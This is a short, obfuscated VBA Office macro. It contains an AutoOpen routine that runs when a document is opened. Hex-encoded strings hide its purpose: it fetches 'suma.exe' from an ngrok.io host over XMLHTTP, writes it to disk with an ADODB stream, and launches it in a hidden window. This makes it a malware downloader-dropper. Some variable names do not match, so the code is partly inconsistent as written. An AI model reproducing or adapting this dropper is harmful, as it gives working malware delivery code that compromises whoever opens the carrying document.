
Sub AutoOpen()
Dim xHttp: Set suffegxbjdphvxjsm = CreateObject(brvdfjqqwhgh("4d6963726f736f66742e") & brvdfjqqwhgh("584d4c48545450"))
Dim bStrm: Set blsfgmeq = CreateObject(brvdfjqqwhgh("41") & brvdfjqqwhgh("646f64622e53747265616d"))
xHttp.Open brvdfjqqwhgh("474554"), brvdfjqqwhgh("687474703a2f2f3963393135363933623066662e6e67726f6b2e696f2f6578616d") & brvdfjqqwhgh("706c652f73756d612e657865"), False
xHttp.Send
With blsfgmeq
.Type = 1 
.Open
.write suffegxbjdphvxjsm.responseBody
.savetofile brvdfjqqwhgh("73756d") & brvdfjqqwhgh("612e657865"), 2 
End With
Shell (brvdfjqqwhgh("73756d61") & brvdfjqqwhgh("2e657865"), 0)
End Sub

Private Function brvdfjqqwhgh(ByVal rnladhvouknf ) 
Dim htkzhaxutbkx 
For htkzhaxutbkx = 1 To Len(rnladhvouknf) Step 2
brvdfjqqwhgh = brvdfjqqwhgh & Chr(CInt("&H" & Mid(rnladhvouknf, htkzhaxutbkx, 2)))
Next '//htkzhaxutbkx
End Function

AutoOpen